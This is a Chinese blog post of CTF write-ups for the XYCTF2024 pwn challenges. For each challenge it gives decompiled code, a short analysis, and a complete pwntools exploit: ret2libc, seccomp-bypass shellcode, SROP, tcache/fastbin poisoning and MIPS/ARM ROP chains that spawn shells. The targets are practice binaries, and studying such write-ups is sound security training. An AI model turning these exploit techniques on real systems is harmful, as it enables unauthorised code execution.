---
title: "XYCTF2024PWN"
date: 2026-10-11T14:35:25.270000+00:00
description: "久违地找了场比赛复现"
tags:
  - "pwn"
categories:
  - "CTF"
---

> 更新于 2026-11-21

[复现网址](https://gz.imxbt.cn/games/4/)

## hello world (签到)

主函数如下

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
      char buf[32]; // [rsp+0h] [rbp-20h] BYREF

      init();
      printf("%s", "please input your name: ");
      read(0, buf, 0x48u);
      printf("Welcome to XYCTF! %s\n", buf);
      printf("%s", "please input your name: ");
      read(0, buf, 72u);
      printf("Welcome to XYCTF! %s\n", buf);
    return 0;
}
```

### 分析

通过 `%s` 第一次泄露 libc，第二次 ret2libc。

### EXP

```python
from pwn import *
context(arch = 'amd64',log_level = 'debug',terminal=['tmux','new-window'])

io = process('./vuln')
# gdb.attach(io)
io.sendlineafter(b"name: ",b'A'*40)
io.recvuntil(b'A'*40)
libc_base = u64(io.recv(6).ljust(8,b'\x00')) - 0x29d0a
log.info(f"libc -> {hex(libc_base)}")

libc = ELF('./libc.so.6')
system = libc_base + libc.sym['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))
pop_rdi= libc_base + 0x2a3e5
retn   = libc_base + 0x2a3e6

payload = flat(
    b'a'*40,
    p64(pop_rdi),
    p64(bin_sh),
    p64(retn),
    p64(system),
)

io.sendline(payload)

io.interactive()
```

## invisible flag

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  void *addr; // [rsp+8h] [rbp-118h]

  init();
  addr = mmap((void *)0x114514000LL, 0x1000u, 7, 34, -1, 0);
  if ( addr == (void *)-1LL )
  {
    puts("ERROR");
    return 1;
  }
  else
  {
    puts("show your magic again");
    read(0, addr, 0x200u);
    sandbox();
    ((void (*)(void))addr)();
    return 0;
  }
}
```

### 分析

使用 `seccomp-tools dump ./vuln` 检查沙箱。

```bash
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x0b 0xc000003e  if (A != ARCH_X86_64) goto 0013
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x08 0xffffffff  if (A != 0xffffffff) goto 0013
 0005: 0x15 0x07 0x00 0x00000000  if (A == read) goto 0013
 0006: 0x15 0x06 0x00 0x00000001  if (A == write) goto 0013
 0007: 0x15 0x05 0x00 0x00000002  if (A == open) goto 0013
 0008: 0x15 0x04 0x00 0x00000013  if (A == readv) goto 0013
 0009: 0x15 0x03 0x00 0x00000014  if (A == writev) goto 0013
 0010: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0013
 0011: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0013
 0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0013: 0x06 0x00 0x00 0x00000000  return KILL
```

想到的方式是使用 `openat` 打开文件返回文件描述符 `fd`；再使用 `sendfile` 让内核把 `/flag` 的内容直接拷到 stdout。

> ~~如何编写 shellcode~~

### EXP

```python
from pwn import *
context(arch = 'amd64',log_level = 'debug')

# sandbox: read write open readv writev execve execveat

# openat(AT_FDCWD, "/flag", O_RDONLY);
# sendfile(1, fd, NULL, 0x100);

shellcode = """
    mov rbx, 0x67616c662f ;
    push rbx;
    mov rsi, rsp;
    mov rdi,0xffffffffffffff9c;
    xor rdx, rdx;
    mov rax, 257;
    syscall;

    mov rdi, 1;
    mov rsi, rax
    xor rdx, rdx
    mov r10, 0x100
    mov rax, 40
    syscall

    mov rax, 0x3C;
    xor rdi, rdi;
    syscall;
"""
shellcode=asm(shellcode)

# io = process('./vuln')
io = remote("challenge.imxbt.cn",32236)

sc="""break *$rebase(0x143B)
c
"""

# gdb.attach(io,sc)
io.recvuntil(b'again')
io.send(shellcode)

io.interactive()
```

## static link

### 逆向

```c
__int64 vuln()
{
  _BYTE v1[32]; // [rsp+0h] [rbp-20h] BYREF

  IO_puts("static_link? ret2??");
  return _libc_read(0, v1, 256);
}
```

静态链接的题目，找 gadget 打 ret2syscall 就可以了。

### EXP

```python
from pwn import*
context(arch = 'amd64',log_level = 'debug',os='linux')

# io = process('./vuln')
io = remote("challenge.imxbt.cn",30509)

POP_RDI_RET=0x0000000000401f1f
POP_RSI_RET=0x0000000000409f8e
POP_RDX_RET=0x0000000000451322
POP_RAX_RET=0x0000000000447fe7
SYSCALL    =0x0000000000401cd4
RET        =0x000000000040101a
READ_ADDR  =0x0000000000447580
addr       =0x00000000004C72C0

payload=b'A'*32+b'DEEDBEEF'
payload+=p64(POP_RDX_RET)+p64(8)
payload+=p64(POP_RSI_RET)+p64(addr)
payload+=p64(POP_RDI_RET)+p64(0)
payload+=p64(READ_ADDR)
payload+=p64(POP_RDX_RET)+p64(0)
payload+=p64(POP_RSI_RET)+p64(0)
payload+=p64(POP_RDI_RET)+p64(addr)
payload+=p64(POP_RAX_RET)+p64(59)
payload+=p64(SYSCALL)

io.sendline(payload)
io.send(b'/bin/sh\x00')

io.interactive()
```

## fmt

我的机器因为玄学问题复现不了它，不复现了。

## malloc flag

我都多余写 exp。

## baby gift

### 逆向

```c
void GetInfo()
{
  char s[32]; // [rsp+0h] [rbp-40h] BYREF
  char v1[32]; // [rsp+20h] [rbp-20h] BYREF

  printf("Your name:");
  putchar(10);
  fgets(s, 32, stdin);
  printf("Your passwd:");
  putchar(10);
  fgets(v1, 64, stdin);
  Gift();
}
```

还有一段汇编

```nasm
endbr64
push    rbp
mov     rbp, rsp
mov     [rbp+var_8], rdi
nop
pop     rbp
retn
```

### 分析

要泄露 libc 地址，`fgets` 执行后 rdi 还是 v1 的地址，`Gift` 函数会把 rdi 保存到 `Gift` 的栈帧上。

如果 `v1` 写成一个格式化字符串，再返回 `0x401274` 也就是 `call printf` 就能泄露 libc 地址。后续输入还要向栈上写数据，所以不能把 rbp 写坏了，于是把 `saved rbp` 改成 `.bss` 段后面，栈迁移到那里。

### EXP

```python
from pwn import *
context(arch = 'amd64',log_level = 'debug')

io = process('./vuln')
libc=ELF('./libc.so.6',checksec=False)

retn = 0x4012AE

io.recvuntil("name:")
io.sendline(b'A'*8)

payload = b'%3$p'.ljust(0x20, b'\x00')
payload+= p64(0x404200)+p64(0x401274)

io.recvuntil(b'passwd:')
io.sendline(payload)

io.recvuntil(b'0x')

leak = int(io.recv(12),16)
log.success(f"leak -> {hex(leak)}")
libc.address = leak - 0x1147e2

ogg = libc.address+ 0xebc81

payload = cyclic(0x20)
payload+= p64(0x404220)+p64(ogg)
io.sendline(payload)

io.interactive()
```

## Intermittent

### 逆向

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned __int64 i; // [rsp+0h] [rbp-120h]
  void *v5; // [rsp+8h] [rbp-118h]
  int buf[66]; // [rsp+10h] [rbp-110h] BYREF
  unsigned __int64 v7; // [rsp+118h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  init(argc, argv, envp);
  v5 = mmap((void *)0x114514000LL, 0x1000u, 7, 34, -1, 0);
  if ( v5 == (void *)-1LL )
  {
    puts("ERROR");
    return 1;
  }
  else
  {
    write(1, "show your magic: ", 17u);
    read(0, buf, 0x100u);
    for ( i = 0; i <= 2; ++i )
      *((_DWORD *)v5 + 4 * i) = buf[i];
    ((void (*)(void))v5)();
    return 0;
  }
}
```

很短的程序，分配了一块内存，给了可读可写可执行权限，要写 shellcode 执行。

但是这段 shellcode 被截断了，只能连续地写 4 字节，之后有 12 字节的空隙。

考虑写一个 syscall read 二次读入 shellcode，需要设置参数，`read(0,buf,0x100)` 后 rdi 仍保持 0，rdx 的值是该块内存的地址。也可以直接做 `read` 的 size。

push 一个字节，pop 一个字节，`jmp $+14` 两个字节，之后去触发 syscall read 读 shellcode。

### EXP

```python
from pwn import *
context.arch='amd64'

shellcode=asm("""
    push rdx
    pop rsi
    jmp $+14
    syscall
    """)

sh = asm("""
    mov rbx, 0x68732f6e69622f ;
    push rbx;
    mov rdi, rsp;

    xor rsi,rsi;
    xor rdx,rdx;
    mov rax,0x3b;
    syscall;
    """)

io = process("./vuln")

gdb.attach(io, gdbscript="""
break *$rebase(0x135A)
continue
""")

io.recvuntil(b'magic: ')
io.sendline(shellcode)

pause()
io.sendline(b'\x90'*0x12 + sh)

io.interactive()
```

## guestbook1

### 逆向

```c
void __cdecl GuestBook()
{
  int index; // [rsp+Ch] [rbp-224h] BYREF
  char name[32][16]; // [rsp+10h] [rbp-220h] BYREF
  unsigned __int8 id[32]; // [rsp+210h] [rbp-20h] BYREF

  puts("Welcome to starRail.");
  puts("please enter your name and id");
  while ( 1 )
  {
    while ( 1 )
    {
      puts("index");
      __isoc99_scanf("%d", &index);
      if ( index <= 32 )
        break;
      puts("out of range");
    }
    if ( index < 0 )
      break;
    puts("name:");
    read(0, name[index], 0x10u);
    puts("id:");
    __isoc99_scanf("%hhu", &id[index]);
  }
  puts("Have a good time!");
}

void __cdecl backdoor()
{
  puts("oh,you find it.");
  system("/bin/sh");
}

int  main()
{
  init();
  GuestBook();
  return 0;
}
```

`GuestBook` 的逻辑是序号满足 `0 <= index <= 32`，name[32] 和 id[32] 都是越界写的。能看出来 name[32] 对应的是 id[0]，id[32] 对应的是 rbp。它读取的是 `%hhu`，也就是一个字节大小的无符号整数，也就是只能修改 rbp 的最低一个字节。

修改最低一字节的指向，其实就是把栈迁移到栈上。

可以把 id 写成后门地址，之后把 rbp 的最后一字节改成 0x88。这样就会在 main 结束后去执行 backdoor。

因为你能控制 id 的 16 个字节，所以另一种改法是把 rbp 的最后一字节改成 0x90。把 id+8 写后门地址，id 随便填充 8 字节。

遇到栈迁移问题自己调整一下即可。因为每次栈地址是随机的，所以多试几次就行。

### EXP

```python
from pwn import *
context(arch='amd64', log_level='debug', os='linux')

def win():
    # io = process('./pwn')
    io = remote('challenge.imxbt.cn',32557)
    io.sendlineafter(b'index',b'32')
    io.sendlineafter(b'name',p64(0x401323))
    io.sendlineafter(b'id:\n',str(0x28).encode())
    io.sendlineafter(b'index',b'-1')
    io.sendline(b'echo WIN; cat flag')
    out = io.recvrepeat(0.3)
    io.close()
    return out

while True:
    out = win()
    if b'WIN' in out:
        log.success("WIN")
        break
```

## simple srop

### 逆向

```asm
endbr64
push    rbp
mov     rbp, rsp
mov     rax, 0Fh
syscall                 ; LINUX - sys_rt_sigreturn
retn
```

```c
int main()
{
  _BYTE buf[32]; // [rsp+0h] [rbp-20h] BYREF

  init(argc, argv, envp);
  read(0, buf, 0x200u);
  return 0;
}
```

是简单的 SROP。

### EXP

```python
from pwn import *
context(arch='amd64', log_level='debug', os='linux')

io = process('./vuln')
def dbg():
    sc = '''break *0x4012cf
    c
    '''
    gdb.attach(io, sc)

syscall = 0x40129D
sigretrun = 0x401296
main_addr = 0x4012A3
bss = 0x404100
flag_str = bss
store_flag = bss+0x500

sign = SigreturnFrame()
sign.rax = 0
sign.rdi = 0
sign.rsi = 0x404200
sign.rdx = 0x800
sign.rip = syscall
sign.rsp = 0x404208

io.sendline(b'a'*40 + p64(sigretrun) + bytes(sign))
pause()
signopen = SigreturnFrame()
signopen.rax = 2
signopen.rdi = 0x404200
signopen.rsi = 0
signopen.rip = syscall
signopen.rsp = 0x404308

signread = SigreturnFrame()
signread.rax = 0
signread.rdi = 3
signread.rsi = 0x404100
signread.rdx = 0x3c
signread.rip = syscall
signread.rsp = 0x404408

signwrite = SigreturnFrame()
signwrite.rax = 1
signwrite.rdi = 1
signwrite.rsi = 0x404100
signwrite.rdx = 0x3c
signwrite.rip = syscall
signwrite.rsp = 0

io.sendline(b'flag\0\0\0\0' + p64(sigretrun) + bytes(signopen) + p64(sigretrun) +
            bytes(signread) + p64(sigretrun) + bytes(signwrite))

io.interactive()
```

## fastfastfast

### 逆向

```c
void create()
{
  unsigned int v0; // ebx
  unsigned int idx; // [rsp+4h] [rbp-1Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-18h]

  puts("please input note idx");
  __isoc99_scanf("%u", &idx);
  if ( idx <= 15 )
  {
    v0 = idx;
    note_addr[v0] = malloc(0x68u);
    puts("please input content");
    read(0, note_addr[idx], 0x68u);
  }
  else
  {
    puts("idx error");
  }
}

void delete()
{
  unsigned int idx; // [rsp+Ch] [rbp-14h] BYREF
  unsigned __int64 v1; // [rsp+18h] [rbp-8h]

  puts("please input note idx");
  __isoc99_scanf("%u", &idx);
  if ( idx <= 0xF )
    free(note_addr[idx]);
  else
    puts("idx error");
}

void show()
{
  unsigned int idx; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v1; // [rsp+8h] [rbp-8h]

  v1 = __readfsqword(0x28u);
  puts("please input note idx");
  __isoc99_scanf("%u", &idx);
  if ( idx <= 0xF )
  {
    if ( note_addr[idx] )
      write(1, note_addr[idx], 0x68u);
    else
      puts("note is null");
  }
  else
  {
    puts("idx error");
  }
}
```

Glibc 2.31，从名称看出是 fastbin attack。缺少 edit 功能。

`delete` 函数未将 free 后的指针置零，存在 UAF 漏洞。

### EXP

```python
from pwn import *
context(log_level = 'debug')

io = process("./vuln")

def menu(choice):
    io.sendlineafter(b'>>>',str(choice).encode())

def add(idx,data):
    menu(1)
    io.sendlineafter(b'idx',str(idx).encode())
    io.sendafter(b'content',data.ljust(0x68,b'\x00'))

def delete(idx):
    menu(2)
    io.sendlineafter(b'idx',str(idx).encode())

def show(idx):
    menu(3)
    io.sendlineafter(b'idx',str(idx).encode())

def dbg():
    g = '''break *0x401547
    c
    '''
    gdb.attach(io, g)

for i in range(12):
    add(i,str(i).encode())

for i in range(9):
    delete(i)

menu(1)
io.sendlineafter(b'idx',b'1'*0x500)

show(7)
io.recv(1)
leak = u64(io.recv(8)[:6].ljust(8,b'\x00'))
success(f"leak -> {hex(leak)}")
libc = ELF("./libc-2.31.so",checksec=False)
libc.address = leak - 0x1eccb0
malloc_hook = libc.address + 0x1ecb70
ogg = libc.address + 0xe3b31

# dbg()

delete(9)
delete(10)
add(6,b'6')
delete(10)

add(13,p64(malloc_hook-0x33))

for i in range(0, 6):
    add(i,str(i).encode())

add(0,b'6')

add(14, b'\x00'*0x23+p64(ogg))

menu(1)
io.sendline(b'1')

io.interactive()
```

## one byte

### 逆向

Glibc 2.31。漏洞在 `edit_chunk` 函数中，`read_data` 函数存在 Off-By-One 漏洞。受一篇复现文章的影响，尝试了 fastbin attack，结果迟迟没有打通，而且感到非常别扭，于是直接使用了 tcache poisoning。

```c
ssize_t read_data(void *ptr, unsigned int len)
{
  return read(0, ptr, len + 1);
}

unsigned __int64 edit_chunk()
{
  unsigned int v1; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("[?] please input chunk_idx: ");
  __isoc99_scanf("%u", &v1);
  if ( v1 <= 0x1F )
  {
    if ( inused_list[v1] )
    {
      if ( chunk_list[v1] )
        read_data((void *)chunk_list[v1], size_list[v1]);
      else
        puts("[-] No such chunk!");
    }
    else
    {
      puts("[-] Chunk not inuse!");
    }
  }
  else
  {
    puts("[-] Chunk limit exceeded!");
  }
  return __readfsqword(0x28u) ^ v2;
}
```

思路是先填满 tcache，再通过 unsorted bin 泄露 libc 地址，然后通过 Off-By-One 构造出一个 UAF，最后 tcache poisoning 修改 `__free_hook` 为 `system`，再通过 UAF 调用 `free` 执行 `system("/bin/sh")`。

通过 Off-By-One 等方式制造出的 UAF 很好用。其他的伪造 chunk 制造堆块重叠的方式也很好用。

### EXP

```python
from pwn import *
context(arch='amd64', log_level='debug', os='linux')

libc = ELF('./libc.so.6')
io = process('./vuln')

def dbg():
    gdb.attach(io,gdbscript="breakrva 0x1817")

def menu(choice):
    io.sendlineafter(b'>>>',str(choice).encode())

def add(idx,size):
    menu(1)
    io.sendlineafter(b'idx:',str(idx).encode())
    io.sendlineafter(b'size:',str(size).encode())

def delete(idx):
    menu(2)
    io.sendlineafter(b'idx:',str(idx).encode())

def show(idx):
    menu(3)
    io.sendlineafter(b'idx:',str(idx).encode())

def edit(idx,data):
    menu(4)
    io.sendlineafter(b'idx:',str(idx).encode())
    io.send(data)

for i in range(7):
    add(i,0xf8)

add(7,0xf8)
add(8,0xf8)

for i in range(7):
    delete(i)

delete(7)

for i in range(7):
    add(6-i,0xf8)

add(7,0x98)
show(7)

io.recvuntil(b'\x20')
libc_base = u64(io.recv(6).ljust(8,b'\x00')) - 0x1eccd0
success(f"libc -> {hex(libc_base)}")
malloc_hook = libc_base+0x1ecb70
free_hook = libc_base+libc.sym['__free_hook']
system = libc_base+libc.sym['system']

add(9,0x58)

add(10,0x68)
add(11,0x68)
add(12,0x68)
add(13,0x68)

edit(10,b'x'*0x68+b'\xe1')
delete(11)
add(11,0xd0)
delete(10)
delete(12)
edit(11,b'x'*0x68+p64(0x71)+p64(free_hook))

add(12,0x60)
add(14,0x60)
edit(14,p64(system))
edit(1,b'/bin/sh\x00')
delete(1)

io.interactive()
```

## EZ1.0?

> 第一次做异架构，借此机会学习了很多

### 逆向

```c
int vuln()
{
  _BYTE v1[64]; // [sp+18h] [+18h] BYREF

  _libc_read(0, v1, 256);
  return 0;
}
```

是 32 位 MIPS 架构的栈溢出，但是打起来有些麻烦，因为我没有找到 gadget。

### EXP

```python
from pwn import *
context(arch='mips', log_level='debug')

io = process(['qemu-mipsel-static','-g' ,'1234', './mips'])
# io = process(["qemu-mipsel-static","./mips"])
# io = remote('challenge.imxbt.cn',31649)

shellcode = asm(shellcode="""
li $t6, 0x6e69622f
li $t7,0x68732f
sw $t6, 0xc($sp)
sw $t7, 0x10($sp)
sw $zero, 0x14($sp)

la $a0, 0xc($sp)
li $a1, 0
li $a2, 0

li $v0, 4011
syscall
nop

""")

payload = b'a' * 0x40
payload += p32(0x492900)
payload += p32(0x400860)

io.sendline(payload)

pause()

payload = b'a' * 0x44
payload += p32(0x492900+0x60)
payload += shellcode

io.sendline(payload)

io.interactive()
```

## EZ2.0

### 逆向

```c
int vuln()
{
  _BYTE v1[64]; // [sp+0h] [bp-44h] BYREF

  _libc_read(0, v1, 256);
  return 0;
}
```

ARM 的指令看起来比 MIPS 更加易懂一些。这个题也能打 ROP。我找到了一些非常合适的 gadget。

### EXP

```python
from pwn import*
context.arch = "arm"
context.log_level = "debug"

io = process(['qemu-arm','./arm'])
io = process(['qemu-arm','-g' ,'1234', './arm'])

pop_r1_r2_lr_bx_lr = 0x0005f428
pop_r0_pc = 0x0005f73c
pop_r1_pc = 0x0005f824
pop_r7_pc = 0x00027d78
svc       = 0x0005829c

binsh = 0x0008A090

payload = b'\x00'*68
payload+= p32(pop_r1_r2_lr_bx_lr)
payload+= p32(0)
payload+= p32(0)
payload+= p32(pop_r0_pc)
payload+= p32(binsh)
payload+= p32(pop_r1_pc)
payload+= p32(0)
payload+= p32(pop_r7_pc)
payload+= p32(0xb)
payload+= p32(svc)

# io.recvuntil(b'world')
io.sendline(payload)

io.interactive()

```

## ptmalloc2 it's myheap

### 逆向

根据代码可以还原出如下结构体。

```c
struct chunk
{
  __int64 size;
  __int64 is_used;
  char *dataptr;
};

```

以下是部分伪代码。

```c
int _()
{
  printf("this is a gift: %p\n", &puts);
  return gift(hello_world);
}

unsigned __int64 add_chunk()
{
  unsigned __int64 id; // [rsp+8h] [rbp-28h] BYREF
  size_t size; // [rsp+10h] [rbp-20h] BYREF
  chunk *ptr; // [rsp+18h] [rbp-18h]
  void *buf; // [rsp+20h] [rbp-10h]
  unsigned __int64 v5; // [rsp+28h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  printf("[?] please input chunk_idx: ");
  __isoc99_scanf("%lld", &id);
  if ( id < 0x10 )
  {
    printf("[?] Enter chunk size: ");
    __isoc99_scanf("%lld", &size);
    ptr = (chunk *)malloc(0x18u);
    ptr->size = size;
    if ( ptr )
    {
      buf = malloc(size);
      ptr->dataptr = (char *)buf;
      if ( buf )
      {
        printf("[?] Enter chunk data: ");
        read(0, buf, size);
        chunk_list[id] = ptr;
        ptr->is_used = 1;
      }
      else
      {
        puts("[-] Failed to create chunk for data!");
      }
    }
    else
    {
      puts("[-] Failed to create new chunk!");
    }
  }
  else
  {
    puts("[-] Chunk limit exceeded!");
  }
  return v5 - __readfsqword(0x28u);
}

unsigned __int64 delete_chunk()
{
  unsigned __int64 id; // [rsp+8h] [rbp-18h] BYREF
  chunk *ptr; // [rsp+10h] [rbp-10h]
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("[?] Enter chunk id: ");
  __isoc99_scanf("%lld", &id);
  if ( id < 0x10 )
  {
    ptr = chunk_list[id];
    if ( ptr )
    {
      if ( ptr->is_used )
      {
        free(chunk_list[id]);
        free(ptr->dataptr);
        ptr->is_used = 0;
      }
      else
      {
        puts("[-] Chunk is not used!");
      }
    }
    else
    {
      puts("[-] No such chunk!");
    }
  }
  else
  {
    puts("[-] Chunk limit exceeded!");
  }
  return v3 - __readfsqword(0x28u);
}

int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  int choice; // [rsp+Ch] [rbp-4h]

  init();
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      choice = get_choice();
      if ( choice != 1 )
        break;
      add_chunk();
    }
    switch ( choice )
    {
      case 2:
        delete_chunk();
        break;
      case 3:
        view_chunk();
        break;
      case 114514:
        _();
        break;
      default:
        puts("[-] exit()");
        exit(0);
    }
  }
}
```

有一个后门函数泄露了 libc 地址，并且调用了一个 `gift(hello_world)`，`gift` 是 `.data` 段上的函数指针，初始指向 `puts`，`hello_world` 也是 `.data` 段上的字符串。

虽然存在指针悬空，但是有 `is_used` 字段的检查，所以开始的时候还没有找到洞在哪里。

漏洞的利用倒也巧妙，由于 tcache 是先进后出的结构，就可以进行以下的操作。

```python
add(0,0x18,data)
delete(0)
add(1,0x18,data)
delete(0)
```

这并不是 double free，由于 data chunk 与 struct chunk 的大小相等，释放后会放在同一个桶中，由于 0 的 data chunk 先释放，所以申请 1 的时候，会先取出 0 的 data chunk 作为 1 的 struct chunk，这样就反过来了，可以控制 0 的 struct chunk，虽然没有 edit 功能，利用难度有所增加，但是仍有巧妙的绕过方法。现在虽然没有任意地址写，但是已经可以任意地址 free 了。

如前面所说，伪造 chunk 制造堆块重叠是一种好用的方法。于是想到通过在较大的 chunk 中伪造较小的 chunk，之后通过修改某 chunk 的 dataptr，使其指向伪造 chunk 的地址。先释放较小的 chunk 进入较小的 tcache bin，之后释放较大的 chunk 进入较大的 tcache bin 后再申请回来就能修改小 chunk 的 next 指针，进而实现 tcache poison。

打 tcache poison 可以申请到 `.data` 段修改 `gift` 和 `hello_world`，这样就可以通过后门函数来 get shell 了。

### EXP

```python
from pwn import *
context(arch='amd64', log_level='info', os='linux')

libc = ELF('./libc.so.6')
io = process('./vuln')

def menu(choice):
    io.sendlineafter(b'>>>',str(choice).encode())

def add(idx,size,data):
    menu(1)
    io.sendlineafter(b'idx',str(idx).encode())
    io.sendlineafter(b'size',str(size).encode())
    io.sendafter(b'data',data)

def delete(idx):
    menu(2)
    io.sendlineafter(b'id',str(idx).encode())

def show(idx):
    menu(3)
    io.sendlineafter(b'id',str(idx).encode())

def leak_libc():
    menu(114514)
    io.recvuntil(b'0x')
    addr = int(io.recv(12),16) - libc.sym['puts']
    success(f"libc -> {hex(addr)}")
    return addr

def dbg():
    g = '''break *0x401778
    c
    '''
    gdb.attach(io, g)

libc_base = leak_libc()
system = libc_base+libc.sym['system']

add(0,0x18,b'0xFF')
delete(0)
add(1,0x18,p64(0x18)+p64(1))
show(0)

io.recvuntil(p64(1))
heap = u64(io.recv(4).ljust(8,b'\x00'))
success(f"heap -> {hex(heap)}")
add(2,0xf8,b'\x00'*(0xf8-0x70)+p64(0x71))
add(3,0x68,b'0xFF')
delete(3)
A = heap + 0x60

delete(0)
add(4,0x18,p64(0x18)+p64(1)+p64(A+0x90))
delete(0)
# dbg()

delete(2)
add(2,0xf8,b'\x00'*(0xf8-0x70)+p64(0x71)+p64((heap>>12)^(0x404070)))

add(5,0x68,b'A'*16)
add(5,0x68,b'/bin/sh\x00'.ljust(16,b'\x00')+p64(system))

menu(114514)

io.interactive()
```

## ptmalloc2 it's myheap 2

### 逆向

这个变体更难一些。不过利用手法与上一题相似。这个文件里面不再有后门函数，同时限制了申请的大小不能超过 0x80。

为了泄露 libc，笔者选择伪造出一个能直接进入 unsorted bin 的 chunk，这跨越了不少 chunk。

令人头疼的是 unsorted chunk 诞生后就不能再随意申请更多 chunk 了，新的 chunk 很容易会破坏已有的堆结构。如果需要什么大小的 chunk，可以提前申请，在 unsorted chunk 诞生后再申请的话，就先释放再申请。

原本笔者看到 `init()` 中调用 `atexit` 注册了一个函数 `manba`，于是笔者细致地追踪了这个过程，并成功将其修改成了 one gadget，但是最后却因为寄存器不满足条件导致触发 one gadget 失败。于是笔者最终通过 environ 泄露栈地址来打 ROP。

笔者泄露栈地址后进行一些操作的时候报了一些错误，原来是将 dataptr 指向 environ 后不能立刻 free，没有 size 字段会直接报错，于是选择了先恢复比较正常的堆状态，虽然仍然不能消除 unsorted chunk。

### EXP

```python
from pwn import *
context(arch='amd64', log_level='info', os='linux')

libc = ELF('./libc.so.6')
# io = process('./vuln')

def menu(choice):
    io.sendlineafter(b'>>>',str(choice).encode())

def add(idx,size,data):
    menu(1)
    io.sendlineafter(b'idx',str(idx).encode())
    io.sendlineafter(b'size',str(size).encode())
    io.sendafter(b'data',data)

def delete(idx):
    menu(2)
    io.sendlineafter(b'id',str(idx).encode())

def show(idx):
    menu(3)
    io.sendlineafter(b'id',str(idx).encode())

def dbg():
    g = '''
    break *0x40149A
    c
    '''
    gdb.attach(io, g)

add(0,0x18,b'\xFF')
delete(0)
add(15,0x18,p64(0x18)+p64(1))
show(0)
io.recvuntil(p64(1))
heap = u64(io.recv(8))
success(f"heap leak : {hex(heap)}")
heap_base = heap

fake = p64(0)+p64(0x431)
add(1,0x78,fake)
add(2,0x78,b'x')
add(3,0x78,b'x')
add(4,0x78,b'x')
add(5,0x78,b'x')
add(6,0x78,b'x')
add(7,0x78,b'x')
add(8,0x28,b'x')

delete(0)
add(14,0x18,p64(0x470)+p64(1)+p64(heap_base+0x20*3+0x10))
delete(0)

show(1)
io.recvuntil(p64(0x431))
libc_base = u64(io.recv(8)) - 0x21ace0
success(f"libc leak : {hex(libc_base)}")
environ = libc_base + 0x222200
system  = libc_base + 0x50d70
binsh   = libc_base + next(libc.search(b'/bin/sh'))
pop_rdi = libc_base + 0x2a3e5
ret     = libc_base + 0x29139

add(0,0x18,b'\xFF')
delete(0)

add(13,0x18,p64(0x18)+p64(1)+p64(environ-8))
show(0)
io.recvuntil(b'\x00'*8)
stack_leak  = u64(io.recv(8))
return_addr = stack_leak - 0x148
success(f"stack {hex(return_addr)}")

delete(13)
add(13,0x18,b'x')
delete(14)
add(14,0x18,p64(0)+p64(1)+p64(heap_base))
delete(3)
delete(8)           # 0x28 以后会用到
delete(4)

add(4,0x78,p64(0)*5+p64(0x31))
delete(0)
add(12,0x18,p64(0x80)+p64(1)+p64(heap_base+0x270))

delete(0)
delete(4)
add(4,0x78,p64(0)*5+p64(0x31)+p64((heap>>12)^return_addr))
# dbg()

payload = p64(0)+p64(ret)+p64(pop_rdi)+ p64(binsh)+p64(system)
add(8,0x28,p64(0xFF))
add(9,0x28,payload)

io.interactive()
```
